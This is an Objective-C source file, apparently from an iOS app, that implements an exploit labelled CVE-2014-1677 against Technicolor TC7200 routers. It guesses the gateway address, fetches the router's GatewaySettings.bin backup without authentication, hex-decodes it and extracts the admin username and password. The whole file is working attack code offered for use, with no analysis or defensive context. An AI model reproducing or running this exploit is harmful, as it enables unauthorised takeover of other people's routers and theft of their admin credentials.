//
//  UMSucks-exploit.m
//  UMSucks
//
//  Created by tihm on 03.07.14.
//  Copyright (c) 2014 tihmstar. All rights reserved.
//


/*
**************************
*                        *
*  CVE : CVE-2014-1677   *
*                        *
**************************
*/

#import "freePW_tc7200Eploit.h"
#include <ifaddrs.h>
#include <arpa/inet.h>

@implementation freePW_tc7200Eploit

+(NSString *)getIPAddressGateway
{
    NSString *address = @"error";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0; // retrieve the current interfaces - returns 0 on success
    
    success = getifaddrs(&interfaces);
    if (success == 0)
    {
        // Loop through linked list of interfaces
        temp_addr = interfaces;
        while(temp_addr != NULL)
        {
            if(temp_addr->ifa_addr->sa_family == AF_INET)
            {
                // Check if interface is en0 which is the wifi connection on the iPhone
                if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"])
                {
                    // Get NSString from C String
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
    }
    
    // Free memory
    freeifaddrs(interfaces);
    
    //assuming gateway is first device in same ip range
    NSRange lastp = [address rangeOfString:@"." options:NSBackwardsSearch];
    
    address = [[address substringToIndex:lastp.location+1] stringByAppendingString:@"1"];
    
    return address;
}

+(NSString*)hexToString:(NSString*)hex{
    
    NSMutableString *ret = [NSMutableString new];
    for (int i=0; i<[hex length]; i+=2) {
        unsigned int mychar;
        [[NSScanner scannerWithString:[NSString stringWithFormat:@"%c%c",[hex characterAtIndex:i],[hex characterAtIndex:i+1]]] scanHexInt:&mychar];
        
        [ret appendString:[NSString stringWithFormat:@"%c",mychar]];
    }
    
    return ret;
}

+(NSArray *)getLoginData:(NSString *)gateway{
    /*
     http://192.168.0.1/goform/system/GatewaySettings.bin
    */
    NSString *url = ([gateway hasPrefix:@"http://"]) ? gateway :  [@"http://" stringByAppendingString:gateway];
    if ([url hasSuffix:@"/"]) url = [url substringToIndex:[url length]-1];
    url = [url stringByAppendingString:@"/goform/system/GatewaySettings.bin"];
    
    //download bin
    NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:url]];
    NSHTTPURLResponse *response;
    NSData *retbin = [NSURLConnection sendSynchronousRequest:request returningResponse:&response error:nil];
    if ([response statusCode] != 200) {
        //NSLog(@"Exploit failed");
        return nil;
    }

   // NSData *retbin = [NSData dataWithContentsOfURL:[NSURL URLWithString:url]];
   //get credentials
    NSString *retbinString = [self hexToString:[[[[retbin description] stringByReplacingOccurrencesOfString:@" " withString:@""] substringFromIndex:1] stringByReplacingOccurrencesOfString:@">" withString:@""]];
   
    NSString *pass = @"";
    NSString *login = @"";
    int i = [retbinString length]-1;
    for (; i> 0; i--) {
        NSString *mychar = [retbinString substringWithRange:NSMakeRange(i, 1)];
        if (*[mychar UTF8String] < 33) break;
        pass = [mychar stringByAppendingString:pass];
    }
    for (;*[[retbinString substringWithRange:NSMakeRange(i, 1)] UTF8String] < 33;i--);
    for (; i> 0; i--) {
        NSString *mychar = [retbinString substringWithRange:NSMakeRange(i, 1)];
        if (*[mychar UTF8String] < 33) break;
        login = [mychar stringByAppendingString:login];
    }
    return [NSArray arrayWithObjects:login, pass, nil];
}

@end
